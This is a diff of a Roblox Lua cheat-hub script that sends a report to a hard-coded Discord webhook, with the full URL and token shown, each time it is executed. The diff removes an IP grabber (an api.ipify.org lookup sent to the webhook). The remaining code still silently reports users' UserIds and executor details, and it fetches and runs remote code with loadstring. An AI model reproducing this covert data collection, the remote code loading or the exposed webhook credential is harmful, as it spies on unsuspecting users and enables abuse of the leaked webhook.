@@ -2,7 +2,6 @@ local BPOwner = false
 local WeebHook = "https://discord.com/api/webhooks/1046955945621737502/HsniRn_0kRUhfXqIb5eI6csZqYwQwWOFm-d1ZJKwk4eoFvvELEnxsD8u_ow-koBGqNzB"
 local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
 local HttpService = game:GetService("HttpService")
-local Ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local UserId = game.Players.LocalPlayer.UserId
 local SupportedGames = loadstring(game:HttpGet('https://raw.githubusercontent.com/miguel831/Roblox-Scripts/main/SSHub/Games.lua', true))()
 local function GetSupportedGame() 
@@ -22,7 +21,7 @@ local InfoSpoofer = function()
             ["username"] = "SSHub",
             ["embeds"] = {
                 {
-                    ["title"] = "Info Spoofer",
+                    ["title"] = "Script Executed",
                     ["color"] = 9893552,
                     ["fields"] = {
                         {
@@ -53,11 +52,6 @@ local InfoSpoofer = function()
 						{
                             ["name"] = "Script",
                             ["value"] = SupportedGame.Script,
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Ip",
-                            ["value"] = "||"..Ip.."||",
                             ["inline"] = true
                         }
                     }
